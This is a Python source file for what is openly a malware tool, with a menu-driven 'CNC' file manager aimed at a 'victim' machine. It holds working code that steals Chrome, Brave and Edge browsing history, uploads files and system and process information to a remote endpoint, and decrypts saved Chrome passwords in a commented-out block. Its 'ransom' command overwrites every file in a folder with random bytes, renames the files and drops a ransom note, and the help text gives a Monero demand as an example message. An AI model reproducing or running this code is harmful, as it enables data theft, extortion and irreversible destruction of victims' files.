import os,time,random
import requests
import os.path as path
import colorama 
import subprocess,socket
import psutil,string
import platform
from tabulate import tabulate
import pathlib
import sqlite3
from colorama import Fore,Style
colorama.init()
"""
TODO-> make the ransomit function generate the real file size 
"""

def gather_info():
    info = ''
    
    # System Information
    info += f'System: {platform.system()} {platform.release()} {platform.machine()}\n'
    
    # Hostname
    hostname = socket.gethostname()
    info += f'Hostname: {hostname}\n'
    
    # CPU Information
    cpu_info = platform.processor()
    info += f'CPU Info: {cpu_info}\n'
    
    # Memory Information
    mem_info = psutil.virtual_memory()
    info += f'Memory Info:\nTotal: {mem_info.total / (1024.0 ** 3):.2f} GB\nAvailable: {mem_info.available / (1024.0 ** 3):.2f} GB\n'
    
    # Disk Usage
    disk_usage = psutil.disk_usage('/')
    info += f'Disk Usage:\nTotal: {disk_usage.total / (1024.0 ** 3):.2f} GB\nUsed: {disk_usage.used / (1024.0 ** 3):.2f} GB\nFree: {disk_usage.free / (1024.0 ** 3):.2f} GB\n'
    
    # Network Interfaces
    net_info = psutil.net_if_addrs()
    info += 'Network Interfaces:\n'
    for interface, addresses in net_info.items():
        info += f'  {interface}\n'
        for address in addresses:
            if address.family == socket.AF_INET:
                info += f'    IPv4 Address: {address.address}\n'
            elif address.family == socket.AF_INET6:
                info += f'    IPv6 Address: {address.address}\n'
    
    # System Load
    load_avg = psutil.getloadavg()
    info += f'System Load: {load_avg[0]:.2f}, {load_avg[1]:.2f}, {load_avg[2]:.2f}\n'
    
    # Processes
    processes = psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent'])
    info += 'Processes:\n'
    for process in processes:
        try:
            process_info = process.info
            info += f'  PID: {process_info["pid"]} Name: {process_info["name"]} User: {process_info["username"]} CPU%: {process_info["cpu_percent"]:.2f} Memory%: {process_info["memory_percent"]:.2f}\n'
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    return info



ENDPOINT = 'http://127.0.0.1:8000'

def writetofile(error:str):
        with open("erors.txt",'a',encoding='utf-8')as e:
            e.write(str(error)+"\n")



              
                    

#print(fd.askdirectory())
"""    
    if platform.system == "Linux":
        try:
            APP.searchfiles('/')
        except Exception as e:
            writetofile(e)
    else:
        APP.searchfiles(os.path.expanduser("~"))
"""

class Stealer:
    def GETBROWSERSHISTORY():
        Stealer.get_brave_history()
        Stealer.get_chrome_history()
        Stealer.get_edge_history()
    def get_brave_history():
        DATA = {}
        DATA["URL"] = "VISITED_TIMES"
        USER = os.getlogin()
        for CHAR in string.ascii_lowercase.upper():
            Path = f"{CHAR}:\\Users\\{USER}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
            if path.isfile(Path):
                conn = sqlite3.connect(Path)
                cr   = conn.cursor()
                cr.execute("SELECT url , visit_count from urls")
                v = cr.fetchall()
                for url,visit_count in v:
                    DATA[url] = visit_count
                SEND_DATA = {"data":dict(DATA),
                             "Pc_Name":str(USER),
                             "Browser_Name":str("Brave")}
                r = requests.post(ENDPOINT+"/api/recive/browser/history",json=SEND_DATA)
                print(r.text)
                break
    def get_chrome_history():
        DATA = {}
        DATA["URL"] = "VISITED_TIMES"
        USER = os.getlogin()
        for CHAR in string.ascii_lowercase.upper():
            Path = f"{CHAR}:\\Users\\{USER}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            if path.isfile(Path):
                conn = sqlite3.connect(Path)
                cr   = conn.cursor()
                cr.execute("SELECT url , visit_count from urls")
                v = cr.fetchall()
                for url,visit_count in v:
                    DATA[url] = visit_count
                SEND_DATA = {"data":dict(DATA),
                             "Pc_Name":str(USER),
                             "Browser_Name":str("Chrome")}
                r = requests.post(ENDPOINT+"/api/recive/browser/history",json=SEND_DATA)
                print(r.text)
                break
        
    def get_edge_history():
        DATA = {}
        DATA["URL"] = "VISITED_TIMES"
        USER = os.getlogin()
        for CHAR in string.ascii_lowercase.upper():
            Path = f"{CHAR}:\\Users\\{USER}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
            if path.isfile(Path):
                conn = sqlite3.connect(Path)
                cr   = conn.cursor()
                cr.execute("SELECT url , visit_count from urls")
                v = cr.fetchall()
                for url,visit_count in v:
                    DATA[url] = visit_count
                SEND_DATA = {"data":dict(DATA),
                             "Pc_Name":str(USER),
                             "Browser_Name":str("Edge")}
                r = requests.post(ENDPOINT+"/api/recive/browser/history",json=SEND_DATA)
                print(r.text)
                break
    """
    def get_chrome_pwrds():
        DATA = {}
        USER = os.getlogin()
        for CHAR in string.ascii_lowercase.upper():
            Path = f"{CHAR}:\\Users\\{USER}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            if path.isfile(Path):
                print(Path)
                conn = sqlite3.connect(Path)
                cr   = conn.cursor()
                cr.execute('SELECT action_url, username_value, password_value FROM logins')
                value = cr.fetchall()
                for origin_url, username, password in value:
                    password = win32crypt.CryptUnprotectData(
                    password, None, None, None, 0)[1]
                    print("Decrypted password:",password)
                    if password:
                        pprint(password)
                        DATA[origin_url]= [f'username:{username}',f'password:{str(password)}']
                
                SEND_DATA = {"DATA":DATA,
                             "PCNAME":USER}
                break
    """


class FileDialog:
    def __init__(self):
        pass

    def removefile(self,filepath):
        try:
                os.remove(filepath)
                print(Fore.GREEN+f"[CNC]:removed file {filepath} successfully")
        except Exception as e:
            writetofile(e)

    def removemanager(self,filepath):
        if os.path.isfile(filepath):
            self.removefile(filepath)
        else:
            for file in os.listdir(filepath):
                        floader = path.join(filepath,file)
                        self.removemanager(floader)

    def uploadfile(self,filepath):
        try:
            if os.path.isfile(filepath):
                try:
                    with open(filepath,"rb") as b:
                        r = requests.post(f"{ENDPOINT}/api/recive/payload/{os.getlogin()}",files={"File_param":b})
                        if r.status_code == 200:
                            print(Fore.GREEN+f"[CNC]:file {filepath} Is being uploaded or uploaded")
                except Exception as e:
                    writetofile(e)
        except Exception as e:
                    writetofile(e)

    def manageupload(self,filepath):
        try:    
            if path.isdir(filepath):
                for file in os.listdir(filepath):
                        floader = path.join(filepath,file)
                        self.manageupload(floader)
            else:
                self.uploadfile(filepath)

        except Exception as e:
            writetofile(e)
    def openreader(self,text,title):
        try:
            data = {
                    "data":str(text),
                    "file_name":str(title)
                    }
                
            r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
        except Exception as e:
            writetofile(e)
    def readfile(self,filepath):
        try:
            myFile=os.open(filepath,os.O_RDONLY)
            myData=os.read(myFile,os.path.getsize(filepath))
            myStr=myData.decode("UTF-8")
            print(myStr)
            self.openreader(myStr,filepath)
        except Exception as e:
             self.openreader(e,"ERROR")
    def makefile(self,name,path):
        try:
            with open(path+"/"+name,'w',errors='ignore')as f:
                f.write("\n")
        except Exception as e:
            writetofile(e)

    def ransomit(self,msg,base):
        for filename in os.listdir(base):
            filepath = os.path.join(base, filename)
            if os.path.isfile(filepath):
                try:
                    with open(filepath, "wb") as filewb:
                            filewb.write(bytearray(random.randbytes(random.randint(1024,5242880))))
                    pth = pathlib.Path(filepath)
                    pth.rename(pth.with_suffix(".ass"))
                except Exception as e:
                        writetofile(e)
                        pass
        with open(f"{base}\\How_to_recover_your_files.txt","w",encoding='utf-8',errors='ignore') as message:
            message.write(msg)    
                        
         
         
    def writetofile(self,text,mode,path):
        try:
            with open(path,str(mode).lower(),errors='ignore')as f:
                f.writelines(text)
        except Exception as e:
            writetofile(e)
         
    def dostufftofile(self,base,filepath,cmd):
        if cmd == "remove":
            self.removefile(filepath=filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "help":
            help = []
            help.append([Fore.RED +"--help"+ Style.RESET_ALL, Fore.RED + "shows this message" + Style.RESET_ALL])
            help.append([Fore.RED +"[dir] --walk"+ Style.RESET_ALL, Fore.RED + "walks to the choosen dir" + Style.RESET_ALL])
            help.append([Fore.RED +"--back"+ Style.RESET_ALL, Fore.RED + "walks to the parent dir" + Style.RESET_ALL])
            help.append([Fore.RED +"[file] --read"+ Style.RESET_ALL, Fore.RED + "reads the contents of the file" + Style.RESET_ALL])
            help.append([Fore.RED +"--upload"+ Style.RESET_ALL, Fore.RED + "uploads the file from the victim machine to the CNC" + Style.RESET_ALL])
            help.append([Fore.RED +"--power"+ Style.RESET_ALL, Fore.RED + "makes a shell to execute commands remotely from the CNC" + Style.RESET_ALL])
            help.append([Fore.RED +"--ipconfig"+ Style.RESET_ALL, Fore.RED + "shows the Ipconfig" + Style.RESET_ALL])
            help.append([Fore.RED +"--whoami"+ Style.RESET_ALL, Fore.RED + "tells you whats the current walking directory" + Style.RESET_ALL])
            help.append([Fore.RED +"--cd| [drive='drivename for example D:']"+ Style.RESET_ALL, Fore.RED + "Change Directory" + Style.RESET_ALL])
            help.append([Fore.RED +"[file or dir] --remove"+ Style.RESET_ALL, Fore.RED + "--remove: deletes the choosen file or dir" + Style.RESET_ALL])
            help.append([Fore.RED +"--mkdir|[name='folder name for example TESTFOLDER']"+ Style.RESET_ALL, Fore.RED + "Makes a Directory" + Style.RESET_ALL])
            help.append([Fore.RED +"--mkfile|[name='filename.extension' for example test.txt]"+ Style.RESET_ALL, Fore.RED + "Makes a Directory" + Style.RESET_ALL])
            help.append([Fore.RED +"[file] --write|[text=thing_to_write mode=[a,wb,w,r,etc] all python modes supported]"+ Style.RESET_ALL, Fore.RED + "Writes to a file" + Style.RESET_ALL])
            help.append([Fore.RED +"--browser_history|[browser='browser' for example browser=brave]"+ Style.RESET_ALL, Fore.RED + "Steals the browser's history" + Style.RESET_ALL])
            help.append([Fore.RED +"--ransom|[msg='the ransom message' for example msg=to recover your files send monero to my wallet 'WALLET' , upload=[true,y,yes,false,no,n] if you want to send all of the files to your cnc before the program encrypt it]"+ Style.RESET_ALL, Fore.RED + "encrypt all files in the directory and leaves a message for the victim" + Style.RESET_ALL])


            help_table = tabulate(help, headers=["command", "description"], tablefmt="fancy_grid")
            print(help_table)
            input("press anything to returns to the file manager")
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "upload" and ENDPOINT != None:
            self.manageupload(filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "read":
            self.readfile(filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "walk":
            if path.isdir(filepath):
                self.searchfiles(filepath)
            else:
                print("you cant walk a file it must be a dir")
                time.sleep(2)
                self.searchfiles(os.path.dirname(filepath))

        elif cmd == "back":
            try:
                self.searchfiles(os.path.dirname(base))
            except Exception as e:
                print(e)
        elif cmd == "info":
            
            Userdata = gather_info()
            try:
                data = {
                    "data":str(Userdata),
                    "file_name":"victim_Info"
                    }
                
                r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
            except Exception as e:
                writetofile(e)
            self.searchfiles(os.path.dirname(filepath))
        
            """
            DOSENT WORK RN
            elif cmd == "power":
                r =  requests.get(ENDPOINT+f"/api/commands/recive/{socket.gethostname()}")
                cmd = r.json()
                print(cmd)
                self.searchfiles(os.path.dirname(filepath))
            """
        elif cmd == "whoami":
            self.openreader(base,"whoami")
            self.searchfiles(os.path.dirname(filepath))       
        elif cmd.split("|")[0] == "cd":
            cmd2 = cmd.split("|")[1]
            if cmd2.split("=")[0] == "drive":
                Path = cmd2.split("=")[1]
            if str(Path).endswith(":\\"):
                pass 
            else:
                Path = Path+":\\"
            print(Path)
            self.searchfiles(Path)
        elif cmd == "ipconfig":
            cmd = ['ipconfig']
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            self.openreader(str(out),"IPCONFIG")
            self.searchfiles(base)

        elif cmd.split("|")[0] == "mkdir":
            
            cmd2 = cmd.split("|")[1]
            if cmd2.split("=")[0] == "name":
                name = cmd2.split("=")[1]
            try:
                    FOLDER = base+"\\"+name
                    os.mkdir(FOLDER)
                    self.searchfiles(FOLDER)
            except Exception as e:
                writetofile(e)
        elif cmd.split("|")[0] == "write":
            try:
                cmd2 = cmd.split("|")[1]
                text = str(cmd2.split("text=")[1]).split("mode")[0]
                mode = cmd2.split("mode=")[1]
                self.writetofile(path=filepath,mode=mode,text=text)
                self.searchfiles(base)
            except:
                 self.searchfiles(base)
        
        elif cmd.split("|")[0] == "mkfile":
            try:
                cmd2 = cmd.split("|")[1]
                subcommand  = str(cmd2.split("=")[0]).lower()
                if subcommand == "name":
                    name = cmd2.split("=")[1]
                    self.makefile(name=name,path=base)
                    self.searchfiles(base)
                else:
                     self.searchfiles(base)
            except:
                 self.searchfiles(base)

        elif cmd.split("|")[0] == "browser_history":
            try:
                cmd2 = cmd.split("|")[1]
                if cmd2.split("=")[0] == "browser":
                    browser = str(cmd2.split("=")[1]).lower()
                    if browser == "brave":
                        Stealer.get_brave_history()
                        self.searchfiles(base)
                    elif browser == "edge":
                        Stealer.get_edge_history()
                        self.searchfiles(base)
                    elif browser == "chrome":
                        Stealer.get_chrome_history()
                        self.searchfiles(base)
                    elif browser == "ALL":
                        Stealer.GETBROWSERSHISTORY()
                        self.searchfiles(base)
                    else:
                         self.searchfiles(base)
                else:
                    self.searchfiles(base)
            except:
                 self.searchfiles(base)                
        elif cmd.split("|")[0] == "ransom":
            cmd2   = cmd.split("|")[1]
            msg    = cmd2.split("msg=")[1].split("upload")[0]
            upload = str(cmd2.split("upload=")[1])
            if upload.lower() == "yes" or upload.lower() == "y" or upload.lower() == "true":
                self.manageupload(filepath)
                self.ransomit(msg,base=base) 
                self.searchfiles(base)
            else:
                self.ransomit(msg,base=base)
                self.searchfiles(base)

    def searchfiles(self,folder_path):
        if platform.system() == "Linux":
            os.system("clear")
        elif platform.system() == "Windows":
            os.system("cls")

        try:
            Files = {}
            data = []
            for file_or_folder in os.listdir(folder_path):
                floder =path.join(folder_path ,file_or_folder)
                file_type = "File" if os.path.isfile(floder) else "Folder"
                if file_type == "File":
                    Files[file_or_folder] = "File"
                    data.append([Fore.RED +file_or_folder+ Style.RESET_ALL, Fore.RED + file_type + Style.RESET_ALL])        
                else:
                    Files[file_or_folder] = "Folder "
                    data.append([Fore.BLUE + file_or_folder + Style.RESET_ALL, Fore.BLUE + file_type + Style.RESET_ALL])        

            table = tabulate(data, headers=["Name", "Type"], tablefmt="fancy_grid")
            print(table)

            inp = input(f"\n\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Filemanager: ")
            try:
                cmd = inp.split("--")[1]
            except:
                print("You have to add a Command")
                self.searchfiles(folder_path)
            filename = inp.split("--")[0].strip(" ")
            floder =path.join(folder_path ,filename)
            print(f"CMD:{cmd} || filepath:{floder} || ENDPOINT:{ENDPOINT}")
            self.dostufftofile(base=folder_path,cmd=cmd.strip(),filepath=floder,)
            
        

        except Exception as e:
            writetofile(e)  
        
APP = FileDialog()
if platform.system == "Linux":
                        try:
                            APP.searchfiles('/')
                        except Exception as e:
                            writetofile(e)
else:
                        APP.searchfiles(os.path.expanduser("~"))
